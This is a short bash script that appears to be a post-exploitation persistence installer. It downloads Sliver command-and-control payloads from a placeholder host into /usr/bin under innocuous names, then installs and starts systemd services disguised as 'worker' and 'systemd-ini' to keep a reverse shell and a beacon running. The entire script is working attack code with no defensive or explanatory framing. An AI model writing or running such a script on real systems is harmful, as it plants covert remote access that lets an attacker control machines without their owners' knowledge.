#!/bin/bash

#Rev shell
wget IP/Beachhead_source/sliverPayLOADS/BEAUTIFUL_APPLAUSE -O /usr/bin/start
wget IP/Services/worker.service -O /etc/systemd/system/worker.service

#Beacon
wget IP/Beachhead_source/sliverPayLOADS/BEAUTIFUL_APPLAUSE -O /usr/bin/sys
wget IP/Services/systemd-ini.service -O /etc/systemd/system/systemd-ini.service

chmod 777 /usr/bin/start
chmod 777 /usr/bin/sys

sleep 5
systemctl enable worker
systemctl start worker

sleep 5
systemctl enable systemd-ini
systemctl start systemd-ini